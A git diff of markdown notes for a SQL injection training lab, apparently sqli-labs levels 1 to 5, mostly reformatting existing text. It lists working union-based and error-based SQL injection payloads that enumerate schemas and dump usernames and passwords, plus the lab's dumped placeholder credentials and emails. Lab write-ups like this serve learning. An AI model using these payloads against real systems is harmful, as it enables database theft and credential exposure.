@@ -21,18 +21,21 @@ _dump the contents of the databse using sqli_
  ##payloads to dump
 ---------------------
 check no: of table included 	=```/?id=1'order by 1,2,3,4--+"```
+
 to find the name of data base	= ```/id=-1' union select 1,database(),3--+```
 to find table name 	    	= ```/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+```
+
 to find the column name	    	=```/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+```
+
 to find the data 	    	=``` /?id=-1' union select 1,group_concat(username),concat(password) from users```
 
 contents of database
 --------------------
-name of database=security
-tables		=emails,referers,uagents,users
-columns		=CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,USER,id,password,username
-usernames	=Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
-password	=Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4  
+* name of database=security
+* tables		=emails,referers,uagents,users
+* columns		=CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,USER,id,password,username
+* usernames	=Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
+* password	=Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4  
 
 ##LESS-2
 ========
@@ -42,11 +45,11 @@ password	=Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,
 
 contents of database
 --------------------
-name of database=security
-tables          =emails,referers,uagents,users
-columns in email=email_id,id
-id		=1,2,3,4,5,6,7,8
-email		=Dumb@dhakkan.com,Angel@iloveu.com,Dummy@dhakkan.local,secure@dhakkan.local,stupid@dhakkan.local,superman@dhakkan.local,batman@dhakkan.local,admin@dhakkan.com 
+* name of database=security
+* tables          =emails,referers,uagents,users
+* columns in email=email_id,id
+* id		=1,2,3,4,5,6,7,8
+* email=Dumb@dhakkan.com,Angel@iloveu.com,Dummy@dhakkan.local,secure@dhakkan.local,stupid@dhakkan.local,superman@dhakkan.local,batman@dhakkan.local,admin@dhakkan.com 
 
 
 ##LESS-3
@@ -66,26 +69,28 @@ LESS-4
 * we can use 'and' or 'or' to complete the query insted of commenting
 contents of database
 --------------------
-name of database=security
-tables		=emails,referers,uagents,users
-columns in referer=id,ip_address,referer
+* name of database=security
+* tables		=emails,referers,uagents,users
+* columns in referer=id,ip_address,referer
 
 
 LESS-5
 ======
 * In this challenge we don't  get any response form the databse directy to the browser
 * but we get the error when we break the query,so we can dump the database through the error
-* we can use rand(),floor(),count()
+* we can use rand(),floor(),count() to get error
 
 
 payloads
 ---------
- this will get database ="/?id=1' AND (select 1 from(select count(*),concat((select database()),floor(rand()*2))a from information_schema.tables group by a)b)--+"
-to get table names="/?id=1' AND (select 1 from(select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand()*2))a from information_schema.tables group by a)b)--+"
-to get columns=/?id=1' AND (select 1 from(select count(*),concat((select column_name from information_schema.columns where table_name='emails' limit 0,1),floor(rand()*2))a from information_schema.tables group by a)b)--+
+this will get database  =```/?id=1' AND (select 1 from(select count(*),concat((select database()),floor(rand()*2))a from information_schema.tables group by a)b)--+```
+
+to get table names      =```/?id=1' AND (select 1 from(select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand()*2))a from information_schema.tables group by a)b)--+```
+
+to get columns          =```/?id=1' AND (select 1 from(select count(*),concat((select column_name from information_schema.columns where table_name='emails' limit 0,1),floor(rand()*2))a from information_schema.tables group by a)b)--+```
 
 contents of database
 --------------------
-databse=security
-tables=emails
-columns=id
+* databse=security
+* tables=emails
+* columns=id
